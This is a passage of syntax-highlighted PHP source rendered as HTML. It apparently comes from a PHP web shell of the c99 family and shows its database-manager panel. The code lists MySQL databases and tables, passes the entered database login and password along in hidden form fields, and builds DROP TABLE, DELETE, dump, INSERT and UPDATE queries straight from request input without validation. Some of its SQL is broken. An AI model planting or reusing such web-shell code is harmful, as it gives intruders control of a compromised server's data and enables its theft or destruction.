class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ]---&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/br&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No tables found in database.&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="cp">?&gt;</span><span class="x">&amp;lt;td width=&quot;1&quot; height=&quot;100&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;b&amp;gt;Home&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;</span><span class="cp">&lt;?php</span>
   <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x">&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;select name=&quot;sql_db&quot;&amp;gt;</span><span class="cp">&lt;?php</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$dbs</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_db</span> <span class="o">==</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span><span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot; selected&quot;</span><span class="p">;}</span> <span class="nv">$dbs</span> <span class="o">.=</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;Databases (&quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$dbs</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;Please, select database&amp;lt;hr size=&quot;1&quot; noshade&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Go&quot;&amp;gt;&amp;lt;/form&amp;gt;</span><span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="c1">//End left panel</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
  <span class="c1">//Start center panel</span>
  <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$c</span><span class="p">))</span> <span class="p">{</span><span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$c</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$c</span> <span class="o">=</span> <span class="s2">&quot;no&quot;</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;There are &quot;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&quot; table(s) in this DB (&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;).&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dbquicklaunch</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbsqlquicklaunch</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;[ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">;}}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;dump&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldrop&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DROP TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblempty&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` </span>
<span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbldump&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$boxtbl</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="nv">$boxtbl</span><span class="p">;}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$thistbl</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dmptbls</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;dump&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblcheck&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;CHECK TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tbloptimize&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;OPTIMIZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblrepair&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;REPAIR TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;tblanalyze&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;ANALYZE TABLE&quot;</span><span class="p">;</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$boxtbl</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">`&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;` ,&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;deleterow&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$boxrow_all</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$boxrow</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot;DELETE * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;</span>
<span class="s2">&quot;</span><span class="p">;}</span> <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span> <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$keys</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
     <span class="nv">$akeys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">);</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$akeys</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`, &quot;</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$keys</span><span class="p">))</span> <span class="p">{</span><span class="nv">$keys</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$keys</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$keys</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
     <span class="nv">$values</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
     <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nb">array_values</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span> <span class="o">=</span> <span class="nv">$sql_tbl_insert_functs</span><span class="p">[</span><span class="nv">$akeys</span><span class="p">[</span><span class="nv">$i</span><span class="p">]])</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="nv">$funct</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$funct</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span> <span class="nv">$values</span> <span class="o">.=</span> <span class="s2">&quot;, &quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$values</span><span class="p">))</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$values</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$values</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">);}</span>
     <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` ( &quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot; ) VALUES ( &quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot; );&quot;</span><span class="p">;</span>
     <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
     <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$set</span> <span class="o">=</span> <span class="nx">mysql_buildwhere</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">,</span><span class="s2">&quot;, &quot;</span><span class="p">,</span><span class="nv">$sql_tbl_insert_functs</span><span class="p">);</span>
     <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;UPDATE `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` SET &quot;</span><span class="o">.</span><span class="nv">$set</span><span class="o">.</span><span class="s2">&quot; WHERE &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
     <span class="nv">$sql_act</span> <span class="o">=</span> <span class="s2">&quot;query&quot;</span><span class="p">;</span>
     <span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;query&quot;</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$sql_query</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;table border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to:&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query :&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">sql_query</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">100</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span 